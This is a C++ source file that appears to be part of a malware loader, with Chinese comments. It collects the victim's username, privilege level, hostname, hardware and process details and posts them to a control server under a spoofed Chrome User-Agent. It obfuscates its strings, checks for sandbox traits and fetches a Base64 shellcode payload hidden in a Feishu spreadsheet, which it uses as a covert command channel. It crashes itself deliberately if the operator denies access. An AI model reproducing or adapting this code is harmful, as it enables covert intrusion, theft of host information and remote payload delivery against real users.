#include "infoSender.h"
#include "../recon/recon.h"
#include "../Tools.h"
#include <rapidjson/document.h>
#include "../md5.h"

HttpClient client;

std::string g_send_time = "";


void send_basic_info(const std::string& url) {
    std::string timeStr = getCurrentTime();
    std::string userStr = GetUsername();
    std::string privilegeStr = GetAccountPrivilege();
    std::string hostnameStr =  GetHostname();
    g_send_time = timeStr;


    std::stringstream ss;
    ss << ENCRYPT_STR(R"({"send_time":")") << timeStr
        << ENCRYPT_STR(R"(","privilege":")") << privilegeStr
        << ENCRYPT_STR(R"(","username":")") << userStr
        << ENCRYPT_STR(R"(","hostname":")") << hostnameStr
        << ENCRYPT_STR(R"("})");

    std::string body = ss.str();    std::vector<std::string> headers = {
        ENCRYPT_STR("Content-Type: application/json"),
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };
    std::string response = client.sendRequest(url, ENCRYPT_STR("POST"), body, headers);
}

void send_env_info(std::string& url) {
    std::string physicalMemoryStr = std::to_string(GetPhysicalMemory());
    std::string cpuCoreNumStr = std::to_string(GetCpuCoreNum());
    std::string bootTimeStr = std::to_string(GetBootTimeMinute());
    std::string resolutionStr = GetResolution();
    std::string tempFileNumStr = std::to_string(GetTempFileNum());
    std::string currentExeDirStr = GetCurrentExeDir();
    std::string parentProcessNameStr = GetParentProcessName();


    std::stringstream ss;
    ss << ENCRYPT_STR(R"({"core_num":")") << cpuCoreNumStr
        << ENCRYPT_STR(R"(","ram":")") << physicalMemoryStr
        << ENCRYPT_STR(R"(","resolution":")") << resolutionStr
        << ENCRYPT_STR(R"(","current_path":")") << currentExeDirStr
        << ENCRYPT_STR(R"(","parent_process":")") << parentProcessNameStr
        << ENCRYPT_STR(R"(","boot_time":")") << bootTimeStr
        << ENCRYPT_STR(R"("})");
    std::string body = ss.str();    
    std::vector<std::string> headers = {
    ENCRYPT_STR("Content-Type: application/json"),
    ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };
    std::string response = client.sendRequest(url, ENCRYPT_STR("POST"), body, headers);
}

void send_info(const std::string& url) {
    std::string basicInfoUrl = url + ENCRYPT_STR("put_basic_info");
    send_basic_info(basicInfoUrl);
    std::string envInfoUrl = url + ENCRYPT_STR("put_env_info");
    send_env_info(envInfoUrl);
}
std::string fetch_index(std::string& serverUrl) {
    MD5 md5;
    std::string hash = md5.calculate(g_send_time);
    std::string url = serverUrl + "/get_index_by_hash?hash_value=" + hash;

    std::vector<std::string> headers = {
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\""),
        ENCRYPT_STR("Accept: application/json")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("GET"), "", headers);
    rapidjson::Document doc;
    if (doc.Parse(response.c_str()).HasParseError()) {
        return "";
    }

    if (!doc.HasMember("index") || !doc["index"].IsInt()) {
        return "";
    }

    return std::to_string(doc["index"].GetInt());
}

std::string fetch_tenant_access_token() {
    std::string url = "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal";

    std::stringstream ss;
    ss << ENCRYPT_STR(R"({"app_id":")") << AppID
        << ENCRYPT_STR(R"(","app_secret":")") << AppSecret
        << ENCRYPT_STR(R"("})");
    std::string body = ss.str();
    std::vector<std::string> headers = {
        ENCRYPT_STR("Content-Type: application/json"),
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
    };
    std::string response = client.sendRequest(url, ENCRYPT_STR("POST"), body, headers);


    rapidjson::Document doc;
    if (doc.Parse(response.c_str()).HasParseError()) {
        return "";
    }

    if (!doc.HasMember("tenant_access_token") || !doc["tenant_access_token"].IsString()) {
        return "";
    }
    std::string token = doc["tenant_access_token"].GetString();
    return token;
}


bool extract_payload_if_allowed(const std::string& response, std::vector<std::string>& payload_parts) {
    rapidjson::Document doc;
    if (doc.Parse(response.c_str()).HasParseError()) {
        return false;
    }

    const auto& root = doc;
    if (!root.HasMember("data") || !root["data"].HasMember("valueRange"))
        return false;

    const auto& valueRange = root["data"]["valueRange"];
    if (!valueRange.HasMember("values") || !valueRange["values"].IsArray())
        return false;

    const auto& rows = valueRange["values"];
    if (rows.Size() == 0 || !rows[0].IsArray())
        return false;

    const auto& row = rows[0];

    if (row.Size() == 0 || row[0].IsNull()) { // 为空 说明还没写入 返回false 重试
        return false;
    }

    if (row.Size() > 0 && row[0].IsBool()) {
        if (!row[0].GetBool()) memcpy(0, 0, 0); // 如果拒绝准入直接AccessDenied 死出去
    }

    for (rapidjson::SizeType i = 1;  i < row.Size(); ++i) {
        const auto& item = row[i];
        if (item.IsNull()) break;
        if (!item.IsString()) break;
        payload_parts.push_back(item.GetString());
    }

    return true;
}
std::string JoinPayloadParts(const std::vector<std::string>& payload_parts) {
    std::string payload;
    for (const auto& part : payload_parts) {
        payload += part;
    }
    return payload;
}
std::vector<unsigned char> fetch_payload(std::string& serverUrl){
    std::string spreadsheet_token = SpreadsheetToken;
    std::string sheet_id = SheetID;
    std::string index = fetch_index(serverUrl);
    std::string range = "O" + index + ":AO" + index;

    
    std::string url = ENCRYPT_STR("https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/") + spreadsheet_token + ENCRYPT_STR("/values/") + sheet_id + ENCRYPT_STR("!") + range;

    std::vector<std::string> headers = {
        ENCRYPT_STR("User-Agent: \"Google Chrome\";v=\"135\", \"Not - A.Brand\";v=\"8\", \"Chromium\";v=\"135\""),
        ENCRYPT_STR("Authorization: Bearer ") + fetch_tenant_access_token(),
        ENCRYPT_STR("Accept: application/json")
    };

    std::string response = client.sendRequest(url, ENCRYPT_STR("GET"), "", headers);
    std::vector<std::string> payload_parts;

    // 拒绝准入 直接死
    // 返回空 等待几秒后轮询
    while (!extract_payload_if_allowed(response, payload_parts)) {
        custom_sleep(10 * 1000);
    }

    if (payload_parts.size() == 0) return std::vector<unsigned char>{};

    std::string payload = JoinPayloadParts(payload_parts);
    std::string decoded = Base64Decode(payload);
    std::vector<unsigned char> shellcode(decoded.begin(), decoded.end());
    return shellcode;
}
